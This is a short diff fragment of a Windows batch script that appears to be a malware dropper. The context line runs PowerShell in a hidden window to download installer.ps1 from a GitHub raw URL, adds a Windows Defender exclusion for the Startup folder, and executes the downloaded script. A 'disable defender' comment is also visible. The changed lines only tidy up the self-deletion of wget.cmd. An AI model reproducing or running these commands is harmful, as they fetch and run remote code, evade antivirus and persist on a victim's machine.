@@ -27,5 +27,4 @@ REM disable defender
 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/MuridFanny/0oiw91383u203218y3/tikus/installer.ps1 -Outfile installer.ps1"; Add-MpPreference -ExclusionPath "C:/users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/installer.ps1"; ./installer.ps1 
 
-cd "C:/users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
-del ./wget.cmd
+del wget.cmd
